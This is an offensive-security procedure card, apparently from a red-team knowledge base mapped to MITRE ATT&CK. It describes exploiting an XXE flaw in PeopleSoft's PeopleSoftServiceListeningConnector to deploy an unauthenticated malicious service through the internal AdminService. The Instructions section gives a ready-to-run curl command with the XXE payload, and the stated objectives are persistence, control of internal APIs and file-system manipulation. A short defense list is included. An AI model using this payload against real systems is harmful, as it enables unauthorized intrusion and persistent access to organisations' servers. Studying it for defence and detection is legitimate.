---
tags:
  - xxe
  - service-deployment
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-xxe-test]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:07.982Z'
sub_techniques: []
id: 507aaf0d-35aa-4143-af54-402fc5ddeb62
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Deploy-Malicious-Service-via-XXE

## Summary

This procedure exploits the confirmed XXE vulnerability to perform a localhost request, deploying a malicious service using the AdminService endpoint and org.apache.pluto.portalImpl.Deploy class, enabling further file manipulation.

## Description

Once XXE is confirmed, craft a payload that uses an external entity to fetch and execute a deployment method from http://localhost:8080/pspc/services/AdminService. This deploys a custom service (e.g., 'lmJyaVBUrfcEfJw') without authentication, leveraging the XML parser's access to internal resources. This step requires the target to expose internal services on localhost.

## Requirements

1. Confirmed XXE in PeopleSoftServiceListeningConnector
2. Internal AdminService on port 8080
3. Crafted XXE payload for deployment

## Defense

Defensive measures and detection strategies:

- Restrict XML parser to internal DTDs only
- Firewall internal services like AdminService from external access
- Log and alert on unexpected service deployments in application logs

## Objectives

1. Deploy unauthorized service for persistence
2. Gain control over internal APIs
3. Enable file system manipulation

## Instructions

### Step 1: Craft and Send Deployment Payload

**Context**: Use XXE to reference the deployment method and execute it.

**Command** ([[commands/curl-post-xxe-test]]):
```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/PSIGW/PeopleSoftServiceListeningConnector -d '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "http://localhost:8080/pspc/services/AdminService?method=!--><ns1:deployment xmlns:ns1=\"org.apache.pluto.portalImpl.Deploy\" ><ns1:serviceName>lmJyaVBUrfcEfJw</ns1:serviceName>...</ns1:deployment>">]><a>&xxe;</a>'
```

> Payload deploys the service; expected output is success or no error, with new endpoint /pspc/services/lmJyaVBUrfcEfJw responding.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xxe-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[xxe]]
- [[service-deployment]]
